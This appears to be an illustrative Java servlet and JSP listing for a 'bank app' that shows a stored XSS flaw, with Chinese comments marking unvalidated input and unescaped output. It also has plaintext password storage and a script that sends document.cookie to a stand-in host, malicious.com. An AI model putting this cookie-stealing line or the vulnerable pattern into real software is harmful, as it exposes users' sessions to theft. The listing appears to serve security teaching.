package com.bank.app;

import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;

// 用户实体类
public class User {
    private String username;
    private String password;
    private String nickname;
    
    public User(String username, String password, String nickname) {
        this.username = username;
        this.password = password;
        this.nickname = nickname;
    }
    
    public String getUsername() { return username; }
    public String getNickname() { return nickname; }
}

// 用户服务类
class UserService {
    private static List<User> users = new ArrayList<>();
    
    public void registerUser(User user) {
        users.add(user); // 未验证输入
    }
    
    public User getUserByUsername(String username) {
        return users.stream()
                   .filter(u -> u.getUsername().equals(username))
                   .findFirst()
                   .orElse(null);
    }
}

// 注册Servlet
@WebServlet("/register")
public class RegisterServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
        throws IOException {
            String username = request.getParameter("username");
            String password = request.getParameter("password");
            String nickname = request.getParameter("nickname");
            
            UserService service = new UserService();
            service.registerUser(new User(username, password, nickname));
            
            response.sendRedirect("/profile?user=" + username);
    }
}

// 用户资料Servlet
@WebServlet("/profile")
public class ProfileServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
        throws IOException, ServletException {
            String username = request.getParameter("user");
            UserService service = new UserService();
            User user = service.getUserByUsername(username);
            
            request.setAttribute("user", user);
            RequestDispatcher dispatcher = request.getRequestDispatcher("userProfile.jsp");
            dispatcher.forward(request, response);
    }
}

// JSP页面（userProfile.jsp）
<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<head><title>用户资料</title></head>
<body>
    <h1>用户资料</h1>
    <% User user = (User) request.getAttribute("user"); %>
    <p>用户名：<%= user.getUsername() %></p>
    <p>昵称：<%= user.getNickname() %></p>  <!-- 直接输出用户输入 -->
    <script>
        // 攻击者可注入恶意脚本
        document.write('<img src="http://malicious.com/steal?cookie=' + document.cookie + '" width=0 height=0>');
    </script>
</body>
</html>